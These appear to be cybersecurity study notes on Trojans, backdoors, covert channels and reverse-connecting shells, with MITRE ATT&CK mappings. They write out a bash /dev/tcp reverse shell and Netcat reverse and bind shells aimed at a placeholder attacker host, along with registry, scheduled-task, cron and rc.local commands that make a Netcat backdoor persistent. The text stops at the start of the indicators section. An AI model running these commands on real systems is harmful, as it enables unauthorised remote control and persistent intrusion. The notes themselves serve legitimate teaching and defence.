# 🐴 Cybersecurity Study Notes — Session 12B
# Trojans & Backdoors · Overt/Covert Channels · Types of Trojans
# Reverse-Connecting Trojans · Netcat Trojan · Indicators

> [!NOTE]
> Session 12B continues directly from 12A's post-exploitation theme.
> Where 12A covered credential theft and surveillance (keyloggers/spyware),
> 12B covers how attackers establish PERSISTENT REMOTE CONTROL of a
> compromised system using Trojans and Backdoors — the core of
> long-term post-exploitation presence.

---

## 📚 Table of Contents

- [🗺️ Where This Session Fits](#-where-this-session-fits)
- [📌 Prerequisites Self-Check](#-prerequisites-self-check)
- [⚠️ Exam Traps & Misconceptions](#-exam-traps--misconceptions)
- [🧱 Foundation Knowledge](#-foundation-knowledge)
- [Section 1 — Trojans & Backdoors](#section-1--trojans--backdoors)
  - [1.1 What Is a Trojan](#11-what-is-a-trojan)
  - [1.2 What Is a Backdoor](#12-what-is-a-backdoor)
  - [1.3 Trojan vs Virus vs Worm](#13-trojan-vs-virus-vs-worm)
  - [1.4 How Trojans Are Delivered](#14-how-trojans-are-delivered)
- [Section 2 — Overt and Covert Channels](#section-2--overt-and-covert-channels)
  - [2.1 Overt Channels](#21-overt-channels)
  - [2.2 Covert Channels](#22-covert-channels)
  - [2.3 Covert Channel Types](#23-covert-channel-types)
  - [2.4 HTTP Tunnelling as a Covert Channel](#24-http-tunnelling-as-a-covert-channel)
- [Section 3 — Types of Trojans](#section-3--types-of-trojans)
  - [3.1 Remote Access Trojans (RAT)](#31-remote-access-trojans-rat)
  - [3.2 Backdoor Trojans](#32-backdoor-trojans)
  - [3.3 Downloader Trojans](#33-downloader-trojans)
  - [3.4 Infostealer Trojans](#34-infostealer-trojans)
  - [3.5 Banking Trojans](#35-banking-trojans)
  - [3.6 Proxy Trojans](#36-proxy-trojans)
  - [3.7 Destructive Trojans](#37-destructive-trojans)
  - [3.8 Botnet Trojans](#38-botnet-trojans)
- [Section 4 — Reverse-Connecting Trojans](#section-4--reverse-connecting-trojans)
  - [4.1 Forward vs Reverse Connection Model](#41-forward-vs-reverse-connection-model)
  - [4.2 Why Reverse Connections Bypass Firewalls](#42-why-reverse-connections-bypass-firewalls)
  - [4.3 Reverse Shell Mechanics](#43-reverse-shell-mechanics)
  - [4.4 Common Reverse Shell Tools](#44-common-reverse-shell-tools)
- [Section 5 — Netcat as a Trojan Backdoor](#section-5--netcat-as-a-trojan-backdoor)
  - [5.1 What Is Netcat](#51-what-is-netcat)
  - [5.2 Netcat Listener and Connect Modes](#52-netcat-listener-and-connect-modes)
  - [5.3 Netcat Bind Shell](#53-netcat-bind-shell)
  - [5.4 Netcat Reverse Shell](#54-netcat-reverse-shell)
  - [5.5 Netcat Persistence Techniques](#55-netcat-persistence-techniques)
- [Section 6 — Indicators of Trojan Infection](#section-6--indicators-of-trojan-infection)
  - [6.1 Host-Based Indicators](#61-host-based-indicators)
  - [6.2 Network-Based Indicators](#62-network-based-indicators)
  - [6.3 Trojan Countermeasures](#63-trojan-countermeasures)
- [📌 Extra Notes](#-extra-notes)
- [Abbreviations Table](#abbreviations-table)
- [🔑 Keywords + Concept Map](#-keywords--concept-map)
- [⚡ Quick Reference Cheatsheet](#-quick-reference-cheatsheet)
- [✅ Session Revision Snapshot](#-session-revision-snapshot)
- [Next Session Bridge](#next-session-bridge)
- [📖 Glossary](#-glossary)

---
# ⚠️ Exam Traps & Misconceptions

| ❌ Misconception | ✅ Reality |
|---|---|
| A Trojan is a type of virus | A Trojan is NOT a virus. Viruses self-replicate by infecting files. Trojans do NOT self-replicate — they disguise themselves as legitimate software. |
| A backdoor is always installed by malware | Backdoors can be intentionally installed by developers (debug backdoors), vendors (NSA PRISM), or attackers. Not all backdoors are malware-installed. |
| Firewalls block all Trojan communication | Traditional firewalls block inbound connections. Reverse-connecting Trojans make OUTBOUND connections from victim to attacker — most firewalls allow outbound traffic by default. |
| Netcat is a hacking tool only | Netcat is a legitimate network utility used by sysadmins for port scanning, file transfer, and debugging. It is dual-use — attackers abuse it as a backdoor. |
| A covert channel always uses encryption | Covert channels hide data IN PLAIN SIGHT within legitimate traffic — encryption is not required. Data can be hidden in packet timing, IP header fields, or DNS queries. |
| RAT and backdoor mean the same thing | A RAT (Remote Access Trojan) provides full remote control including file management, camera, keylogging. A backdoor provides only a shell or command execution channel — it is simpler and narrower. |
| A Trojan always looks like a game or free software | Trojans can be embedded in documents (Word macros), PDF files, image files, browser extensions, software updates, and even hardware firmware. |

---

## 🧱 Foundation Knowledge

<details>
<summary>Click to expand — Must-know before this session</summary>

**Malware Category Overview**

| Type | Self-Replicates? | Needs Host File? | Primary Purpose |
|---|---|---|---|
| Virus | ✅ Yes | ✅ Yes | Infect, damage, spread |
| Worm | ✅ Yes | ❌ No | Spread, consume resources |
| Trojan | ❌ No | ❌ No | Disguise + remote access/theft |
| Backdoor | ❌ No | ❌ No | Persistent remote access channel |
| Spyware | ❌ No | ❌ No | Silent surveillance |
| Ransomware | ❌ No | ❌ No | Encrypt + extort |
| Rootkit | ❌ No | ❌ No | Hide presence of other malware |

**Firewall Basics (Why Reverse Shells Work)**
- Traditional packet-filter firewalls apply rules to INBOUND connections
- Most organisations block unsolicited inbound connections on unknown ports
- OUTBOUND connections are typically allowed (users need internet access)
- Reverse shells exploit this: victim connects OUT to attacker
  → looks like normal outbound traffic → passes through firewall

**TCP Connection Basics**
- Server LISTENS on a port (passive)
- Client CONNECTS to that port (active)
- In a bind shell: victim listens — attacker connects IN (blocked by firewall)
- In a reverse shell: attacker listens — victim connects OUT (allowed by firewall)

**MITRE ATT&CK Tactic Reference**
- TA0001 — Initial Access (how Trojan gets onto the system)
- TA0002 — Execution (Trojan runs)
- TA0003 — Persistence (Trojan survives reboots)
- TA0011 — Command and Control (C2 communication)
- TA0010 — Exfiltration (data sent out via covert channels)

</details>

---

## Section 1 — Trojans & Backdoors

### 1.1 What Is a Trojan

**WHAT:**
A Trojan (Trojan Horse) is malicious software that disguises itself as
a legitimate, useful, or desirable program to trick the user into
installing and executing it. Once executed, it performs malicious
actions hidden from the user — establishing remote access, stealing
data, or dropping additional malware.

**WHY:**
Attackers use Trojans because they rely on human trust rather than
technical exploits. A user who would never click an unknown executable
will happily install what appears to be a game, productivity tool,
software crack, or media codec.

**HOW:**
Attacker packages malicious payload + legitimate-looking program ↓ User installs what they believe is legitimate software ↓ Legitimate function runs (user sees expected behaviour) ↓ Malicious payload executes silently in background ↓ Backdoor established / data stolen / C2 connection made

text


**Analogy:**
The name comes from the Trojan Horse of Greek mythology — Greek soldiers
hid inside a giant wooden horse gifted to the city of Troy. The Trojans
believed it was a gift and brought it inside their walls. At night,
the soldiers emerged and attacked from within. The Trojan malware works
identically — hidden malice inside an apparently legitimate gift.

**Key Characteristics of a Trojan:**
- Does NOT self-replicate (unlike viruses and worms)
- Requires user action to execute (social engineering is the delivery)
- Appears legitimate — often fully functional as claimed
- Malicious payload runs silently alongside or after the visible function
- Primary goal: establish persistent access or steal data

**MITRE ATT&CK:**
- TA0001 — Initial Access (delivery via phishing/social engineering)
- TA0002 — Execution (user runs the Trojan)
- T1204.002 — User Execution: Malicious File

---

### 1.2 What Is a Backdoor

**WHAT:**
A backdoor is a hidden method of bypassing normal authentication
and security controls to gain remote access to a system. A backdoor
provides ongoing access — even if the original vulnerability that
delivered it is patched — because it creates an independent,
undocumented entry point.

**WHY:**
Once an attacker has compromised a system, they want PERSISTENT access
that survives reboots, password changes, and even partial remediation.
A backdoor is the mechanism that guarantees this continued access.

**HOW:**
Initial compromise (Trojan, exploit, phishing) ↓ Backdoor installed on compromised system ↓ Backdoor opens listening port OR makes periodic outbound connection ↓ Attacker connects to backdoor at any time → command shell ↓ Full remote control — independent of original compromise vector

**Types of Backdoor Origins:**

| Origin | Description | Example |
|---|---|---|
| Malware-installed | Trojan drops backdoor after execution | RAT backdoor, Meterpreter |
| Developer-installed | Debug/maintenance access left in production | Asus router backdoor (2014) |
| Vendor/government | Deliberately hidden access for surveillance | Alleged NSA backdoors |
| Insider threat | Legitimate admin installs for later use | Disgruntled employee |
| Supply chain | Pre-installed before delivery | SolarWinds SUNBURST (2020) |

**MITRE ATT&CK:**
- TA0003 — Persistence
- T1543 — Create or Modify System Process
- T1546 — Event Triggered Execution

---

### 1.3 Trojan vs Virus vs Worm

**The single most tested comparison in malware classification:**

| Property | Trojan | Virus | Worm |
|---|---|---|---|
| Self-replicates | ❌ No | ✅ Yes | ✅ Yes |
| Needs host file | ❌ No | ✅ Yes | ❌ No |
| Spreads automatically | ❌ No | ✅ Via file sharing | ✅ Via network |
| Requires user execution | ✅ Yes (initially) | ✅ Yes (host file) | ❌ No |
| Disguises as legitimate | ✅ Yes | ❌ Not typically | ❌ Not typically |
| Primary goal | Remote access/theft | Infect/damage | Spread/consume |
| Example | DarkComet, Gh0st | ILOVEYOU, CIH | WannaCry, Morris Worm |

> [!IMPORTANT]
> The defining trait of a Trojan: **disguise + no self-replication**
> The defining trait of a virus: **needs a host file to infect**
> The defining trait of a worm: **spreads without user action**

---

### 1.4 How Trojans Are Delivered

**Delivery Vectors:**

| Vector | Method | MITRE ID |
|---|---|---|
| Phishing email | Malicious attachment (Word macro, PDF, exe) | T1566.001 |
| Spear phishing | Targeted email to specific individual | T1566.002 |
| Drive-by download | Visiting compromised/malicious website | T1189 |
| Trojanised software | Legitimate software repackaged with malware | T1195.002 |
| USB drop | Malicious USB left in public place | T1091 |
| Fake update | Browser/app update prompt delivers Trojan | T1036.005 |
| Social media | Malicious links in messages/posts | T1566.003 |
| Watering hole | Compromise sites visited by target group | T1189 |
| Supply chain | Inject Trojan into software build pipeline | T1195 |

**Real-World Case 1 — SolarWinds SUNBURST (2020)**
- **Year:** 2020 (discovered December 2020)
- **Technique:** Supply chain attack — attackers compromised SolarWinds'
  build pipeline and injected the SUNBURST backdoor Trojan into legitimate
  signed updates for SolarWinds Orion IT monitoring software
- **Impact:** 18,000+ organisations downloaded the trojanised update.
  Confirmed victims included US Treasury, State Department, DHS, and
  major tech companies. Attributed to APT29 (Cozy Bear / Russia SVR).
- **Lesson:** Signed software from trusted vendors is not inherently safe.
  Supply chain attacks bypass all perimeter defences because the malware
  arrives as a legitimate, signed update from a trusted source.
  MITRE ATT&CK: T1195.002

---

## Section 2 — Overt and Covert Channels

### 2.1 Overt Channels

**WHAT:**
An overt channel is a **legitimate, intended, and authorised**
communication pathway within a system or network. Data flowing through
an overt channel is visible, expected, and policy-permitted.

**Examples:**
- A user browsing HTTPS websites (TCP port 443)
- An email sent through corporate mail server (SMTP port 25/587)
- A file transferred via authorised FTP (TCP port 21)
- DNS queries for name resolution (UDP port 53)

**WHY it matters in the Trojan context:**
Attackers abuse overt channels — specifically HTTPS, DNS, and HTTP —
to hide Trojan C2 communication inside traffic that firewalls and
security tools are configured to allow. The channel itself is legitimate;
the malicious data is hidden inside it.

---

### 2.2 Covert Channels

**WHAT:**
A covert channel is an **unintended, hidden communication pathway**
that transfers information in a way that violates the system's
security policy. It hides the existence of communication itself —
not just the content.

**WHY:**
Trojans and backdoors use covert channels to exfiltrate data and
receive C2 commands while evading detection by firewalls, DLP tools,
and IDS/IPS. The communication looks like legitimate traffic.

**HOW:**
Trojan on victim machine → needs to reach C2 server Standard outbound connection → may be blocked or monitored Covert channel → hides C2 traffic INSIDE allowed protocol Firewall sees: normal DNS queries / normal HTTPS traffic Reality: C2 commands encoded in DNS subdomains / HTTPS payload

**Analogy:**
Imagine a prisoner who is only allowed to send postcards home.
The prison reads every postcard. The prisoner hides secret messages
by capitalising specific letters across multiple postcards — the
message is invisible inside the legitimate, permitted communication.
This is covert channel communication.

**Key Distinction:**

| | Overt Channel | Covert Channel |
|---|---|---|
| Intended? | ✅ Yes | ❌ No |
| Policy-permitted? | ✅ Yes | ❌ No (or exploits permitted channels) |
| Visible to monitoring? | ✅ Yes | ❌ Hidden |
| Example | HTTPS web browsing | C2 commands hidden in DNS queries |

**MITRE ATT&CK:**
- TA0011 — Command and Control
- T1071 — Application Layer Protocol (using legitimate protocols for C2)
- T1132 — Data Encoding (encoding C2 data within protocol)

---

### 2.3 Covert Channel Types

**1. Storage Covert Channel**

Data is hidden in fields that are stored or transmitted but not
normally inspected for content.

| Method | How Data Is Hidden |
|---|---|
| IP Header fields | Data encoded in unused IP header bits (IP ID field, TTL) |
| TCP header fields | Data encoded in sequence numbers, urgent pointer |
| DNS subdomains | C2 commands encoded as subdomains (cmd.a7f3.attacker.com) |
| HTTP headers | Data hidden in custom HTTP headers or User-Agent strings |
| ICMP payload | Data embedded in ICMP echo (ping) packet payload |
| Steganography | Data hidden inside image/audio/video files |

**2. Timing Covert Channel**

Data is encoded in the TIMING of events — not in the content of packets.

| Method | How Data Is Hidden |
|---|---|
| Packet inter-arrival time | Binary 1 = send now, Binary 0 = wait 100ms |
| Retransmission timing | Deliberate retransmission patterns encode data |
| CPU scheduling | Time-sharing variations measurable between processes |

> [!NOTE]
> Timing channels are the hardest to detect because they leave no
> content fingerprint — only statistical analysis of traffic timing
> reveals them. Storage channels are more common in real-world malware.

---

### 2.4 HTTP Tunnelling as a Covert Channel

**WHAT:**
HTTP tunnelling encapsulates non-HTTP traffic (C2 commands, data
exfiltration, even full protocol traffic) inside legitimate HTTP
or HTTPS requests and responses.

**WHY:**
Port 80 (HTTP) and port 443 (HTTPS) are almost universally allowed
through firewalls. By wrapping Trojan C2 communication in HTTP,
attackers guarantee their traffic passes through perimeter controls.

**HOW:**
Trojan C2 command → encoded as HTTP POST body or URL parameter ↓ Victim machine sends HTTP POST to attacker's C2 server ↓ Firewall sees: legitimate outbound HTTP/HTTPS request ↓ Attacker's C2 server decodes command response from HTTP response body ↓ Trojan on victim reads C2 instructions from HTTP response

**Real-World Use:**
- Meterpreter (Metasploit) supports `reverse_https` transport
  — full encrypted C2 over HTTPS — indistinguishable from
  normal HTTPS browsing at the firewall level
- Cobalt Strike Beacon uses HTTPS with randomised URIs and
  malleable C2 profiles that mimic legitimate CDN traffic

**MITRE ATT&CK:**
- T1071.001 — Application Layer Protocol: Web Protocols
- T1572 — Protocol Tunneling

---

## Section 3 — Types of Trojans

### 3.1 Remote Access Trojans (RAT)

**WHAT:**
A RAT provides the attacker with **full remote graphical or command-line
control** of the compromised system — equivalent to sitting at the
victim's keyboard. It is the most capable Trojan category.

**Capabilities of a typical RAT:**
- Remote desktop / screen viewing and control
- File manager (browse, upload, download, delete files)
- Keylogging
- Webcam and microphone activation
- Screenshot capture
- Process and service management
- Shell command execution
- Registry editor access
- Password harvesting
- Reverse shell

**Examples:**

| RAT | Notable For |
|---|---|
| DarkComet | Feature-rich, GUI-based, widely used in APT campaigns |
| Gh0st RAT | Chinese APT tool — used in Operation Aurora (2010) |
| njRAT (Bladabindi) | Widely used in Middle East / North Africa APT operations |
| AsyncRAT | Open-source, actively used in 2023–2025 campaigns |
| Remcos | Commercial RAT marketed as remote admin — heavily abused |
| QuasarRAT | Open-source .NET RAT — used by multiple APT groups |

**MITRE ATT&CK:**
- T1219 — Remote Access Software
- TA0009 — Collection (screen capture, keylogging, file access)

---

### 3.2 Backdoor Trojans

**WHAT:**
A backdoor Trojan's primary function is to open a persistent,
hidden shell or command channel on the victim machine. Simpler
than a full RAT — focused on access rather than surveillance.

**HOW:**
- Opens a listening port on the victim (bind shell model)
- OR makes periodic outbound connections to C2 (reverse shell model)
- Attacker connects and receives a command shell (cmd.exe / bash)
- No graphical interface — command-line interaction only

**Examples:**
- Poison Ivy — classic backdoor Trojan widely used in APT campaigns
- NetBus — early backdoor (1998) — educational/historical reference
- Back Orifice (BO2K) — Windows backdoor by Cult of the Dead Cow (1999)

---

### 3.3 Downloader Trojans

**WHAT:**
A downloader Trojan's sole purpose is to establish an initial foothold
and then download and execute additional malware from a C2 server.
It is a small, simple stager — the real payload arrives after.

**WHY:**
Small initial payloads evade detection more easily. The downloader
establishes connectivity and then pulls the heavy payload (RAT,
ransomware, banking Trojan) once safely inside the network.

**HOW:**
Phishing email → user opens attachment → downloader executes ↓ Downloader contacts C2 server ↓ Downloads full RAT / ransomware / infostealer ↓ Executes downloaded payload


**Examples:** TrickBot (initial stage), Emotet (historically),
Bumblebee loader (2022–2024)

**MITRE ATT&CK:** T1105 — Ingress Tool Transfer

---

### 3.4 Infostealer Trojans

**WHAT:**
Infostealers are designed to silently harvest and exfiltrate
valuable information — credentials, browser-saved passwords,
cryptocurrency wallets, session cookies, system information —
and transmit it to the attacker.

**What they steal:**

| Data Type | Source |
|---|---|
| Browser passwords | Chrome/Firefox SQLite password databases |
| Session cookies | Browser cookie stores (enables session hijacking) |
| Crypto wallets | wallet.dat, MetaMask extension data |
| FTP credentials | FileZilla config files |
| Email credentials | Outlook, Thunderbird profile data |
| System info | OS, hardware, installed software, screenshots |
| RDP credentials | Windows Credential Manager |

**Examples:**
- RedLine Stealer — dominant infostealer 2021–2024
- Raccoon Stealer v2 — widely distributed 2022–2024
- Vidar — actively used in 2024–2025 campaigns
- LummaC2 — emerging infostealer 2023–2025

**MITRE ATT&CK:**
- T1555 — Credentials from Password Stores
- T1539 — Steal Web Session Cookie

**Real-World Case 2 — RedLine Stealer Campaign (2022–2024)**
- **Year:** 2022–2024 (sustained campaign)
- **Technique:** RedLine Stealer distributed via malvertising,
  cracked software downloads, and YouTube video descriptions with
  fake software links. Harvests browser credentials, crypto wallets,
  and session cookies.
- **Impact:** Millions of compromised credential sets sold on
  underground markets (Genesis Market, Russian Market).
  2023: Genesis Market seized by FBI in Operation Cookie Monster.
- **Lesson:** Browser-saved passwords and session cookies are
  high-value targets. Password managers with no browser integration
  are safer. Session cookie theft bypasses MFA entirely.

---

### 3.5 Banking Trojans

**WHAT:**
Banking Trojans specifically target online banking and financial
transactions — intercepting credentials, OTPs, and manipulating
transactions in real time.

**Techniques used:**

| Technique | How It Works |
|---|---|
| Form grabbing | Intercept banking login before HTTPS encryption |
| Web injection | Inject malicious HTML/JS into banking page in browser |
| Man-in-the-Browser (MitB) | Sit between browser and server — modify transactions |
| OTP interception | Capture OTP from SMS via companion mobile component |
| Screen overlay | Display fake login form over real banking app (mobile) |
| Transaction manipulation | Change destination account number before submission |

**Examples:**
- Zeus (Zbot) — the original blueprint for banking Trojans (2007)
- SpyEye — Zeus successor (2010)
- TrickBot — banking Trojan evolved into general-purpose loader
- Dridex — European banking Trojan (Evil Corp / Russia-linked)
- BrasDex — targeting Brazilian banking apps (2022–2023)

**MITRE ATT&CK:**
- T1185 — Browser Session Hijacking
- T1056.003 — Web Portal Capture

---

### 3.6 Proxy Trojans

**WHAT:**
A proxy Trojan converts the compromised system into a proxy server —
routing the attacker's traffic through the victim's machine.

**WHY:**
The attacker's real IP is hidden behind the victim's IP. Attacks
launched through proxy Trojans appear to originate from the victim.

**Use cases:**
- Anonymous browsing and attack launching
- Building residential proxy networks (sold commercially)
- Bypassing geo-restrictions
- Covering tracks for other attacks

**MITRE ATT&CK:** T1090 — Proxy

---

### 3.7 Destructive Trojans

**WHAT:**
Destructive Trojans are designed to damage or destroy data, systems,
or infrastructure rather than maintain stealth for espionage.

**Examples:**

| Malware | Year | Impact |
|---|---|---|
| Shamoon (Disttrack) | 2012 | Wiped 30,000+ computers at Saudi Aramco |
| NotPetya | 2017 | Disguised as ransomware — actually a wiper — $10B+ damage |
| WhisperGate | 2022 | Ukraine government systems — wiper deployed before Russian invasion |
| HermeticWiper | 2022 | Ukraine — deployed hours before Russian invasion |

**MITRE ATT&CK:** T1485 — Data Destruction

---

### 3.8 Botnet Trojans

**WHAT:**
Botnet Trojans enrol the compromised machine into a botnet —
a network of compromised machines (bots) controlled by a C2
infrastructure for coordinated attacks.

**Uses of botnet-enrolled machines:**
- DDoS attacks (volumetric — Mirai, covered in 11D)
- Spam email sending
- Cryptocurrency mining
- Credential stuffing attacks
- Click fraud
- Hosting illegal content

**Examples:**
- Mirai — IoT botnet (2016 Dyn DDoS — 1.2 Tbps)
- Emotet — primary botnet for malware distribution (disrupted 2021,
  returned 2022)
- QakBot (QBot) — banking Trojan + botnet (disrupted August 2023
  in Operation Duck Hunt by FBI)

**MITRE ATT&CK:**
- TA0011 — Command and Control
- T1583.005 — Botnet (acquire infrastructure)
---

## Section 4 — Reverse-Connecting Trojans

### 4.1 Forward vs Reverse Connection Model

**WHAT:**
Every network connection has two roles — one side listens (server),
one side connects (client). In the context of Trojans and backdoors,
the direction of the initial connection determines whether the
backdoor survives firewall filtering.

**Two Models:**

| Model | Who Listens | Who Connects | Also Called |
|---|---|---|---|
| **Bind Shell** | Victim machine | Attacker connects IN to victim | Forward connection |
| **Reverse Shell** | Attacker machine | Victim connects OUT to attacker | Reverse connection |

**Bind Shell (Forward Connection):**
Victim machine opens port 4444 → LISTENS Attacker connects INBOUND to victim:4444 → Attacker gets shell

text


Problem: Corporate firewalls block unsolicited INBOUND connections.
The attacker's connection is blocked at the perimeter.

**Reverse Shell (Reverse Connection):**
Attacker machine opens port 4444 → LISTENS Victim Trojan connects OUTBOUND to attacker:4444 → Attacker gets shell

text


Solution: OUTBOUND connections from victim are typically allowed
(users need internet access). The Trojan's outbound connection
passes through the firewall unblocked.

---

### 4.2 Why Reverse Connections Bypass Firewalls

**WHAT:**
Traditional stateful firewalls apply different policies to inbound
and outbound traffic. Most organisations permit outbound connections
on common ports (80, 443, 53) while blocking unsolicited inbound
connections on unknown ports.

**WHY this is exploitable:**
Firewall ruleset (typical corporate): INBOUND: Allow established/related only → BLOCKS new inbound on 4444 OUTBOUND: Allow all → PERMITS victim connecting OUT to attacker

text


**HOW attackers maximise bypass success:**

| Technique | How It Bypasses Firewall |
|---|---|
| Use port 443 (HTTPS) | Firewall allows outbound 443 — looks like web browsing |
| Use port 80 (HTTP) | Firewall allows outbound 80 — looks like web traffic |
| Use port 53 (DNS) | DNS tunnelling — firewall allows outbound DNS |
| Wrap in HTTPS/TLS | Payload encrypted — IDS cannot inspect content |
| Mimic legitimate domains | C2 domain looks like CDN or cloud provider |
| Domain fronting | Use CDN (Cloudflare, AWS) as intermediary — blocks by IP impossible |

**Analogy:**
Imagine a prison where guards check everyone who tries to ENTER
but wave through anyone leaving. A prisoner wanting to smuggle
a message out simply walks out with it. The reverse shell is the
Trojan "walking out" — the firewall only checks what comes IN.

**MITRE ATT&CK:**
- T1571 — Non-Standard Port
- T1573 — Encrypted Channel
- T1090.004 — Domain Fronting

---

### 4.3 Reverse Shell Mechanics

**WHAT:**
A reverse shell is a shell session (command-line access) where the
compromised machine initiates the connection to the attacker, and
then redirects its standard input, standard output, and standard
error streams to the attacker's listener.

**HOW — Step by Step:**
Step 1: Attacker sets up listener nc -lvnp 4444 (Netcat listening on port 4444)

Step 2: Trojan executes on victim machine Shell process spawned on victim stdin/stdout/stderr redirected to attacker IP:4444

Step 3: Victim machine connects OUTBOUND to attacker:4444

Step 4: Attacker's listener receives connection → Interactive shell on victim machine → Attacker types commands → victim executes → output returns

Step 5: Attacker has command-line control of victim

text


**What the attacker sees after connection:**
listening on [any] 4444 ... connect to [attacker_ip] from [victim_ip] 54231 Microsoft Windows [Version 10.0.19044.2965] C:\Users\victim>

text


**Stream Redirection (Linux reverse shell — conceptual):**
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

text

- `bash -i` — interactive bash shell
- `>& /dev/tcp/attacker_ip/4444` — redirect stdout+stderr to TCP socket
- `0>&1` — redirect stdin from same socket
- Result: full interactive shell over TCP connection

**MITRE ATT&CK:**
- T1059 — Command and Scripting Interpreter
- T1059.004 — Unix Shell
- T1059.003 — Windows Command Shell

---

### 4.4 Common Reverse Shell Tools

| Tool | Type | Notes |
|---|---|---|
| **Netcat (nc)** | Network utility | Classic — see Section 5 |
| **Metasploit Meterpreter** | Advanced RAT payload | Encrypted, in-memory, feature-rich |
| **Cobalt Strike Beacon** | Commercial C2 | Used by red teams and APTs — malleable C2 |
| **PowerShell Empire** | Post-exploitation framework | PowerShell-based — fileless |
| **Sliver** | Open-source C2 | Go-based — modern alternative to Cobalt Strike |
| **Havoc C2** | Open-source C2 | Used in 2023–2024 APT campaigns |
| **socat** | Network relay tool | More powerful than Netcat — supports SSL |

**Meterpreter Transport Options:**

| Transport | Port Used | Bypass Capability |
|---|---|---|
| reverse_tcp | Any (often 4444) | Basic |
| reverse_http | 80 | Bypasses port-based firewall rules |
| reverse_https | 443 | Encrypted + bypasses inspection |
| reverse_dns | 53 | DNS tunnelling — bypasses most firewalls |

**MITRE ATT&CK:**
- T1219 — Remote Access Software
- TA0011 — Command and Control
- T1572 — Protocol Tunneling (DNS/HTTP/HTTPS transport)

---

## Section 5 — Netcat as a Trojan Backdoor

### 5.1 What Is Netcat

**WHAT:**
Netcat (nc) is a lightweight, versatile command-line network utility
that reads and writes data across network connections using TCP or UDP.
It is often called the **"Swiss Army knife of networking"**.

**WHY it exists (legitimate use):**
- Port scanning
- Banner grabbing
- File transfer between systems
- Network debugging and testing
- Proxying and relaying network traffic
- Testing firewall rules

**WHY attackers use it:**
- Pre-installed on most Linux systems
- Windows version freely available
- No installation required — can run as a portable executable
- Minimal network footprint
- Can create bind shells and reverse shells with a single command
- Difficult to distinguish from legitimate network activity

**Netcat variants:**

| Variant | Platform | Notable Feature |
|---|---|---|
| nc (traditional) | Linux/Unix | Classic — on most systems by default |
| ncat | Linux (Nmap project) | Supports SSL encryption |
| nc.exe | Windows | Ported version for Windows |
| cryptcat | Cross-platform | Adds Twofish encryption to Netcat |
| socat | Linux | Extended Netcat — supports SSL natively |

> [!NOTE]
> Netcat is dual-use. Detecting it on a system is not automatically
> an indicator of compromise — sysadmins use it legitimately.
> Context matters: what port is it listening on? What process spawned it?
> What is the parent process? These questions determine malicious use.

---

### 5.2 Netcat Listener and Connect Modes

**Two fundamental operating modes:**

**LISTEN Mode (Server):**
nc -lvnp [port]

-l : listen mode -v : verbose output -n : no DNS resolution (faster) -p : specify port number

The machine running this command WAITS for an incoming connection
on the specified port.

**CONNECT Mode (Client):**
nc [target_ip] [port]

The machine running this command actively CONNECTS to the target
IP on the specified port.

**Basic Chat / File Transfer Test:**
Machine A (listener): nc -lvnp 4444 Machine B (connect): nc [Machine_A_IP] 4444 → Anything typed on B appears on A — and vice versa → File transfer: nc -lvnp 4444 > received.txt (receiver) nc [IP] 4444 < file_to_send.txt (sender)

---

### 5.3 Netcat Bind Shell

**WHAT:**
A bind shell is created when Netcat on the VICTIM machine listens
on a port and provides a shell to whoever connects. The attacker
connects inbound to the victim.

**On victim machine (Windows):**
nc -lvnp 4444 -e cmd.exe

- `-e cmd.exe` — execute cmd.exe and connect its I/O to the socket
- Victim is now listening on port 4444
- Anyone who connects receives a Windows command shell

**On victim machine (Linux):**
nc -lvnp 4444 -e /bin/bash

**Attacker connects:**
nc [victim_ip] 4444 → Receives cmd.exe or bash shell on victim

**Why bind shells are less preferred by attackers:**
- Requires inbound connection from attacker to victim
- Corporate firewalls typically block inbound connections on port 4444
- The listening port on the victim is visible in `netstat` output
- Easier for defenders to detect open listening ports via port scanning

---

### 5.4 Netcat Reverse Shell

**WHAT:**
A reverse shell is created when Netcat on the VICTIM machine
connects OUTBOUND to the attacker's listener, providing a shell
to the attacker.

**Step 1 — Attacker sets up listener:**
nc -lvnp 4444

Attacker's machine waits for incoming connection on port 4444.

**Step 2 — Victim Trojan executes (Windows):**
nc [attacker_ip] 4444 -e cmd.exe

Victim connects outbound to attacker and attaches cmd.exe to the socket.

**Step 2 — Victim Trojan executes (Linux):**
nc [attacker_ip] 4444 -e /bin/bash

**Result:**
Attacker's listener receives connection from victim → Attacker has interactive cmd.exe or bash shell on victim → Connection was OUTBOUND from victim — passed through firewall

**Why reverse shells are preferred by attackers:**
- Outbound connections allowed by most firewalls
- Attacker controls the listening side — victim just connects
- Can use port 443 to blend with HTTPS traffic
- Victim does not expose a listening port — harder to detect
  with passive port scanning

**Comparison:**

| | Bind Shell | Reverse Shell |
|---|---|---|
| Who listens | Victim | Attacker |
| Connection direction | Attacker → Victim (inbound) | Victim → Attacker (outbound) |
| Firewall bypass | ❌ Usually blocked | ✅ Usually allowed |
| Detection via netstat | Easier (open port on victim) | Harder (outbound connection) |
| Preferred by attackers | ❌ No | ✅ Yes |

---

### 5.5 Netcat Persistence Techniques

**WHAT:**
A one-time Netcat shell dies when the connection drops. Attackers
need Netcat to restart automatically after reboot or disconnection.

**Persistence Methods:**

**1. Windows Registry Run Key**
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v backdoor /d "nc -lvnp 4444 -e cmd.exe" /f

Netcat starts automatically at every Windows startup.
MITRE: T1547.001 — Boot or Logon Autostart: Registry Run Keys

**2. Windows Scheduled Task**
schtasks /create /tn "SystemUpdate" /tr "nc -lvnp 4444 -e cmd.exe" /sc onstart /ru SYSTEM

Runs as SYSTEM at every startup — elevated privileges.
MITRE: T1053.005 — Scheduled Task

**3. Linux Cron Job**
@reboot nc -lvnp 4444 -e /bin/bash


Added to crontab — restarts Netcat on every boot.
MITRE: T1053.003 — Cron

**4. Linux /etc/rc.local**
echo "nc -lvnp 4444 -e /bin/bash &" >> /etc/rc.local


Executes on system startup.
MITRE: T1037.004 — Boot Initialization Scripts

**5. Looping Netcat (keep-alive)**
while true; do nc -lvnp 4444 -e /bin/bash; done


Restarts the listener immediately after each connection drops.
Ensures continuous availability without requiring a reboot trigger.

> [!WARNING]
> Any of these persistence mechanisms will show up in:
> - Registry Run keys (autoruns tools)
> - Scheduled tasks list
> - Crontab entries
> - Active network connections (netstat -antp)
> - Process list (nc.exe or nc running unexpectedly)
> These are all Indicators of Compromise (IOCs) — covered in Section 6.

---

## Section 6 — Indicators of Trojan Infection

### 6.1 Host-Based Indicators

**WHAT:**
Host-based indicators are artefacts on the local system that suggest
a Trojan or backdoor is present — detectable without network monitoring.

**Process Indicators:**

